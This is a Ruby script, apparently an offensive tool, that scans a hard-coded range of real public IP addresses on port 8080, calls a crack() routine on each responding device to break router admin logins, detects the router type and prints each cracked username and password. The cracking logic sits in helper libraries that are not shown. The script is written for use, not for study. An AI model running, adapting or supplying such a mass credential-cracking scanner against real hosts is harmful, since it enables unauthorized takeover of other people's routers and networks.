require 'socket'
require 'net/http'
require "base64"
require 'thread'
require 'timeout'
require './lib/routerFP'
require './lib/objRpw'
require './lib/joinThread'


routers=[]
routersCrack=[]
threads=[]

c=0
for i in (1..100)
		threads << Thread.new("190.158.217.#{i}") do |ipTmp|
			tmp=Rpw.new(ipTmp,8080)
			if tmp.active
			      routers << tmp
			end
		end
end
puts "[+] total ip Scanned: #{threads.size}"
threads=joinThread(threads)
puts "[+] ip Found: #{routers.size}"

c=0;
routers.each do |router|
	threads << Thread.new(router) do |routerTmp|
		ret=routerTmp.crack()
		if  ret != false
			routerTmp.detect(ret[:response].body)
			if routerTmp.routerType==:cisco
				ret2=routerTmp.crack("/wlanBasic.asp");
				if ret2 != false
					puts "[++] #{routerTmp.ip}\t:\tCracked - type: #{routerTmp.routerType[0..6]}\t\t- user #{routerTmp.user}\t: password #{routerTmp.passwd}"
				end
			else
				puts "[++] #{routerTmp.ip}\t:\tCracked - type: #{routerTmp.routerType[0..6]}\t\t- user #{routerTmp.user}\t: password #{routerTmp.passwd}"
				routersCrack << routerTmp
			end
		else
			puts "[++] #{routerTmp.ip}\t:\tFail"
		end
	end
	if threads.size != 0 && threads.size % 20 == 0
		threads=joinThread(threads)
		
	end
	
	
end
threads=joinThread(threads)
puts "[+] Routers Cracked: #{routersCrack.size}"
